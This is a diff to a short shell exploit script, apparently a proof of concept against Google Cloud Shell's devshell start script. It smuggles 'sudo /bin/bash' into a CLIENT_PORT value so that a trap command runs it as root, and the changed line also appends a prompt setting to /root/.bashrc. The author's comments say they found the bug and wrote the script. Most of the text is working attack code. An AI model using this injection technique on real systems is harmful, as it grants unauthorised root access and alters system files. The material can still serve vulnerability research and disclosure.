@@ -14,11 +14,12 @@ echo "/google/devshell/start-shell.sh"
 # Spring it - get a (root) shell
 (
   DEVSHELL_CLIENTS_DIR="/tmp"
-  CLIENT_PORT="8080; sudo /bin/bash --init-file <(echo 'export PS1=\"root@PortPaws: # \"')"
+  CLIENT_PORT="8080; echo 'export PS1=\"root@PortPaws: # \"' | sudo tee -a /root/.bashrc; sudo /bin/bash"
   trap "sudo rm -f ${DEVSHELL_CLIENTS_DIR}/${CLIENT_PORT}" EXIT
   exit
 )
 
 # Written on a 2020 MacBook Air - Silver.
 # I echo the path, because I'm tired of trying to find vulnerable paths for old bugs after months, LOL.
-# I found the bug yesterday, and fixed/wrote the script today. 
+# I found the bug yesterday, and fixed/wrote the script today.
+
